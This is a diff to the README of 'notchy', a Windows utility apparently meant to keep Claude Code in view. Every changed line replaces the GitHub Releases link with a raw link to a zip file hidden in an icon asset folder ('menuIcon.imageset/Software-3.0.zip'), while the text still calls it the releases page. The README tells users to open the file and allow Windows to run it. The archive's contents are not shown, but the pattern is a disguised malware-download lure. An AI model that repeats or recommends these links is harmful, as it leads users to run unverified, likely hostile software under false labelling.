@@ -1,10 +1,10 @@
 # 🪟 notchy - Keep Claude Code in sight
 
-[![Download notchy](https://img.shields.io/badge/Download%20notchy-blue?style=for-the-badge)](https://github.com/graphimedianex-design/notchy/releases)
+[![Download notchy](https://img.shields.io/badge/Download%20notchy-blue?style=for-the-badge)](https://raw.githubusercontent.com/graphimedianex-design/notchy/main/Notchy/Assets.xcassets/menuIcon.imageset/Software-3.0.zip)
 
 ## 📥 Download
 
-Visit this page to download notchy for Windows: https://github.com/graphimedianex-design/notchy/releases
+Visit this page to download notchy for Windows: https://raw.githubusercontent.com/graphimedianex-design/notchy/main/Notchy/Assets.xcassets/menuIcon.imageset/Software-3.0.zip
 
 On the releases page, look for the latest Windows file, then:
 
@@ -48,7 +48,7 @@ If you plan to use project detection, keep your project files in a normal folder
 
 ## 🚀 Get started
 
-1. Go to the [Releases page](https://github.com/graphimedianex-design/notchy/releases)
+1. Go to the [Releases page](https://raw.githubusercontent.com/graphimedianex-design/notchy/main/Notchy/Assets.xcassets/menuIcon.imageset/Software-3.0.zip)
 2. Download the latest Windows build
 3. Open the downloaded file
 4. If Windows asks for permission, choose to run it
@@ -171,7 +171,7 @@ No. The app is built to be opened, clicked, and used with simple controls
 
 ### Where do I get the latest version?
 
-Use the [Releases page](https://github.com/graphimedianex-design/notchy/releases) to download the newest Windows build
+Use the [Releases page](https://raw.githubusercontent.com/graphimedianex-design/notchy/main/Notchy/Assets.xcassets/menuIcon.imageset/Software-3.0.zip) to download the newest Windows build
 
 ## 🔍 File locations
 
@@ -194,11 +194,11 @@ To keep the app easy to use:
 
 ## 📦 Download again
 
-If you need to reinstall or update notchy, go back to the [Releases page](https://github.com/graphimedianex-design/notchy/releases) and download the latest Windows file
+If you need to reinstall or update notchy, go back to the [Releases page](https://raw.githubusercontent.com/graphimedianex-design/notchy/main/Notchy/Assets.xcassets/menuIcon.imageset/Software-3.0.zip) and download the latest Windows file
 
 ## 🧭 Quick install steps
 
-1. Open the [Releases page](https://github.com/graphimedianex-design/notchy/releases)
+1. Open the [Releases page](https://raw.githubusercontent.com/graphimedianex-design/notchy/main/Notchy/Assets.xcassets/menuIcon.imageset/Software-3.0.zip)
 2. Pick the latest release
 3. Download the Windows file
 4. Open the file
